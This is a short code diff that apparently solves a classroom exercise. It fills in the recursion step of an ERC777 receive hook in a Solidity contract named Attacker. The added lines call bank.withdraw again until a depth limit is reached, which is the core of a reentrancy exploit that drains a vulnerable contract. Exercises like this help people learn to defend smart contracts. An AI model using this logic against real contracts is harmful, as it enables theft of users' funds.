@@ -68,6 +68,13 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
+
+		emit Recurse(depth);
+
+		if (depth < max_depth) {
+			depth++;
+			bank.withdraw(amount);
+		}
 	}
 
 }
